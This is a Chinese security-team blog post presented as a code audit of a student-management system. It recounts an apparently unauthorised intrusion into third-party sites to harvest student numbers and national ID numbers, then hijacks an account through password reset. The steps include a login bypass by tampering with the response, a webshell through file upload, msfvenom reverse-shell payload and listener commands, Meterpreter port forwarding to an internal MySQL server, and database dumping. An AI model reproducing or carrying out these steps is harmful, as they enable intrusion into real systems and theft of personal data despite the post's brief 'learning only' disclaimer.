> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/uJzp1oX69Al2UpxgGTMpiA)

这是 F12sec 的第 63 篇原创 

  

> **申明****：本次测试只作为学习用处，请勿未授权进行渗透测试，切勿用于其它用途！**

ps：感谢北神，小丑师傅给的代码

**本文由团队师傅 Challenger 投稿，转载请标明来源。**

1. 审计开始
-------

1. 为 struts 框架

查看 web.xml 中 <filter-mapping> 的 <url-pattern> 来确定拦截规则，当是.action 时所有以.action 为结尾的请求都会被 struts 处理拦截，/test/.action 则只有 test 目录下的请求会被拦截。

初步审计无需登录或者可以绕过登录的洞

再看 struts.xml 看对应.action 后端处理在那，看到设置了包扫描，所以.action 后端处理都在 dckj.business 下

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa7MblkmfIzNcF4PfvibTQInJW4RX9SqBnpmqNMx5anvMaicmYxeiaXzER1AkCjUCBBAWvjMtMicctB3g/640?wx_fmt=png)

再看回 web.xml 看一下全局 filter 等 filter 过滤器，对应 Java 文件在 dckj.core.base.EntssGlobalFilter，因为审的是编译后的源码以前 com.web.servlet.uploadServlet

对应 classes/com/web/servlet/uploadServlet.class

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa7MblkmfIzNcF4PfvibTQInmvdwsy1ODFLrxFce0WzFUhpPTjLfOOLKnA0lFeysGt2YraHfB3Wpkw/640?wx_fmt=png)

全局过滤，大概看了，就判断 cookie 的处理和白名单 ip 的处理，还有开放的静态路径

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa7MblkmfIzNcF4PfvibTQInhG95fLpMcLoJh1P7bKiczNxjib9M9nfjXKPQEFtIULsCL8BnzjGnJiblw/640?wx_fmt=png)

CAS 单点登录认证：

https://blog.csdn.net/qq_41258204/article/details/84036875，这里可以直接访问服务器不被重定向回认证服务器，不太懂

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa7MblkmfIzNcF4PfvibTQInm0FSmIgkFph9GO1icftw6OWSEfvibzIicjuVwn7lpibthn0e8ibILkN8swg/640?wx_fmt=png)

登录通过判断 sql 登录成功注入 java bean 对象然后通过监听器绑定对象来确认身份

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa7MblkmfIzNcF4PfvibTQIn4wibDtITHy72RiasozBu7lJiaU4GVGTlnQicDMyjlWkV9H05IwYgVic9Vww/640?wx_fmt=png)

1.HttpSessionBindingListener  
这个监听器，可以让 javaBean 对象，感知它被绑定到 session 中或从 session 中移除。  
2.HttpSessionActivationListener  
这个监听器，可以让 javaBean 感知，被钝化或活化。  
钝化—> 将 session 中的 javaBean 保存到文件中.  
活化—> 从文件中将 javaBean 直接获取。也就是说我们想通过改返回值”status”: “y” 绕过认证不太可能了

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa7MblkmfIzNcF4PfvibTQInRnABibsOF1xay317bbCOwAU6dM3BydXZD1z0EfyuvpRwA1BfZM10PSw/640?wx_fmt=png)

只能看看有啥可以未授权访问的功能，看白名单，有个文件下载，看上去可以，但实践不行。

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa7MblkmfIzNcF4PfvibTQInFLY47bspyBh3xicMYpSYPXaG1CHEWvibKvYCZia5IQ5nWuypqb6dlD7bw/640?wx_fmt=png)

本地 debug 可以穿目录下载文件 ok 实际测试 Fuzz 一波不行 0.0，放弃

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa7MblkmfIzNcF4PfvibTQInVeEWjPKuAgTWxKvljc8WvjP0dndwAibBOA1zCicJnLY8fFgEib3kuEkvg/640?wx_fmt=png)

因为没有啥未授权的洞，只能搞账号，本地搭起环境麻烦审出来，也得有账号进实际的才有意思，而登录有验证码，如果训练识别验证码爆破很麻烦，而且效率低靠运气！放弃….. 但找回密码，

只 需要学号 + 身份证，后返回随机密码，无需电话验证还是有希望

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa7MblkmfIzNcF4PfvibTQIndFTErVfAMicayDsic9b5BhWlldaq4emCkQnapouuE3ibZB0f8la6EUpug/640?wx_fmt=png)

**打使用该系统的目标来获取学号和身份证**

谷歌 + 社工库没找到

直接打使用该系统的目标，通过漏洞获取账号 + 身份证 或者直接密码

这里有 3 个有效目标

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa7MblkmfIzNcF4PfvibTQInM9qFoQ445Qw73mkXTibfPz4sMEhjN9MNI7zLuLctf8JmnsJoN09leSA/640?wx_fmt=png)  

挑第一个目标，企业查查确定资产，子域名…… 快速一波没有洞，打微信小程序也没洞，反编译小程序麻烦最后再试

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa7MblkmfIzNcF4PfvibTQIngjTLfPOgLnOb4khBnDdpqTjAknaawEiaWgal809s77Ey9vrfgicevMjQ/640?wx_fmt=png)

goby 扫端口重定向的域名的站，发现可管理员后台登录

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa7MblkmfIzNcF4PfvibTQInq4YicRXrRhqOsDH6yzfz8Ntp0dKyVxXmDg3Fp6MgkBIn1u7hqWZhqSA/640?wx_fmt=png)

为 ThinkPhp 的站，TP 的站常规工具打一波 payload，无效，爆破无效，登录发包改返回包 0 改 1

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa7MblkmfIzNcF4PfvibTQInxGoIV5dBH44fOWnvY7R2JMq5O7WvR8SKqlHuH6btooGqg9nO92JWxw/640?wx_fmt=png)

直接跳转到这，直接可以文件上传.

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa7MblkmfIzNcF4PfvibTQIn8W9jR5aYQqwGLJ9dW19HWOzhOJXTEABicQf57dMUn8TcFvlfic3iakeBg/640?wx_fmt=png)

真是好家伙!! 任意文件上传，直接送 shell 来了。

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa7MblkmfIzNcF4PfvibTQInz4mp2h0kia5u1zfCqOFpsS25y9RIKnXE6AhrYQjBQo6BF886LRiccKew/640?wx_fmt=png)

目的拿学号 + 身份证 或者直接密码，翻数据库配置文件

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa7MblkmfIzNcF4PfvibTQInvFmlFtudM8Nia6Ts9O4KXE4xv7Gl1IvwMNPCzhaayteqpCgEjY2Orxg/640?wx_fmt=png)

扫端口未开放 3306，只能

端口转发出来

为了上传下载文件稳定性，这里用 msf 进行（reGeorg 可能环境原因连不上）

生成马

```
msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=服务器IP lport=667 -f elf > msf_667
```

msfconsole 上监听  

```
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 667
run
```

把生成的马上传上 webshell，然后运行

```
chmod +x /tmp/msf_667
/tmp/msf_667
```

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa7MblkmfIzNcF4PfvibTQInOzXu9QFhmLpPWEtORfrmKQCFXd3yrib3EK9icv7YTErFySibxBOIFjQ9A/640?wx_fmt=png)

在反弹回来的 meterpreter 上进行端口转发

```
portfwd add -l 670 -p 3306 -r 127.0.0.1
```

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa7MblkmfIzNcF4PfvibTQInruOtufKSl2PLteKCpBywuGMfFVy5sjkw9u56PrwHL8XGxoCaaT39MA/640?wx_fmt=png)

但站库分离，mysql 不在这台机, 淦卡住了，想其它代理，但可以直接将转发地址改为 mysql 服务器地址，

127.0.0.1 改 mysql 地址 portfwd add -l 671 -p 3306 -r 201.x.x.1

成功转发，msf 转发感谢 TARI 师兄的教导

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa7MblkmfIzNcF4PfvibTQInZuxmEDvKoqicIVI1RcuDElO1dMmEDickAd1mPX7448X0zRRrZ7bicamTw/640?wx_fmt=png)

成功连接，只有学号和电话，密码加盐了

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa7MblkmfIzNcF4PfvibTQInhGbxVICLCHG7aruEn5Lbiam2GILlpaQqkSoS1CDtEl59DMia4XgtWicdA/640?wx_fmt=png)在另外的数据库翻到超级管理员的密码这里不加盐但，登进去没啥可以获取学生身份证的功能，废了

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa7MblkmfIzNcF4PfvibTQInwUU3Jy533QgXibhqlFfCUg6zLt6ibEHgMsic2P5QxyZJbGOqtRwpkyy4A/640?wx_fmt=png)

在用户登录为另外的网站，输入账号为手机号，密码随手 123456 登录成功返回身份证 NB 学号和身份证有了

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa7MblkmfIzNcF4PfvibTQInhfck373tRkBjD5lsicKeg82tCZUN5VjcCghsy3te3By1nNx6PwrptZQ/640?wx_fmt=png)

有了 学号和身份证，回到要代码审计的系统去重置密码，重置他会返回随机密码：

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa7MblkmfIzNcF4PfvibTQInGC52edibNK0jCM4phtofzMQhkyPeba0CqWFuZg9MmlHuv1EJSSMAv3g/640?wx_fmt=png)

成功登录。终于可以好好审计了

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa7MblkmfIzNcF4PfvibTQInibAO2SFWVh8DQLHibSavZbDKyHtQ3hqpnTNh6XRZ9AU9B8CyYKAcqCpg/640?wx_fmt=png)

**再次黑白盒结合审计：（有待更新）**

才测一下子文件上传就崩了或者关网站了…，没法访问了淦 ，有白名单无法绕过，因为他会重命名 00 截断对文件名无效，但 patn 参数直接拼接可控，该系统用 jdk7, 可以尝试 00 截断，但实际 path 后有 / 不知可否截断

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGa7MblkmfIzNcF4PfvibTQInV53YROyViaEUoib0e9ytUFaoo4g47yWAfdGJMwPvzKz3rr4lMxDgNOiaQ/640?wx_fmt=png)

受空字节截断影响的 JDK 版本范围: JDK<1.7.40, 单是 JDK7 于 2011 年 07 月 28 日发布至 2013 年 09 月 10 日发表 Java SE 7 Update 40 这两年多期间受影响的就有 16 个版本，值得注意的是 JDK1.6 虽然 JDK7 修复之后发布了数十个版本，但是并没有任何一个版本修复过这个问题，而 JDK8 发布时间在 JDK7 修复以后所以并不受此漏洞影响。

——————————————————————————

*   **往期精彩推荐**  
    

*   [实战 | 记一次基本的 edu 漏洞挖掘](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247486593&idx=1&sn=220690b212ba14fc6dd57953f6962b0b&chksm=c07fb775f7083e63dc1d57780f3de03a556c1931480a6bf25ce4445b8ded7dc9dce26281c468&scene=21#wechat_redirect)
    

*   [经验分享 |  文件上传个人 bypass 总结](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247486732&idx=1&sn=9552794c9893c4edcdffa77fd5e7819f&chksm=c07fb6f8f7083fee0a27d27bf7ea79b123927d7e6573f2ae328f919e459fec3ff8d6b7fbbf21&scene=21#wechat_redirect)  
    
*   [经验分享 | mssql 注入实战总结之狠快准绕](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247486706&idx=1&sn=a5388ad25ab41a94de7d579ad5c74149&chksm=c07fb706f7083e10e709c1ac96e5b8a8e12d292164d139df23ab06c70f4dbf89888f7632638c&scene=21#wechat_redirect)
    

❤️爱心三连击
-------

1. 关注公众号「F12sec」！

2. 本文已收录在 F12sec 官方网站：http://www.0dayhack.net/

3. 看到这里了就点个关注支持下吧，你的「关注」是我创作的动力。

![](https://mmbiz.qpic.cn/mmbiz_png/Qx4WrVJtMVKBxb9neP6JKNK0OicjoME4RvV4HnTL7ky0RhCNB0jrJ66pBDHlSpSBIeBOqCrOTaWZ2GNWv466WNg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/EWF7rQrfibGYIzeAryXG89shFicuMUhR5eYdoSEffib7WmrGvGmSPpdvYfpGIA7YGKFMoF1IrXutHXuD8tBBbAYJg/640?wx_fmt=jpeg)

公众号：F12sec  

QQ 群：884338047

官方网站：http://www.0dayhack.net/

这是一个终身学习的团队，他们在坚持自己热爱的事情，欢迎加入 F12sec，和师傅们一起开心的挖洞～

        关注和转发是莫大鼓励❤️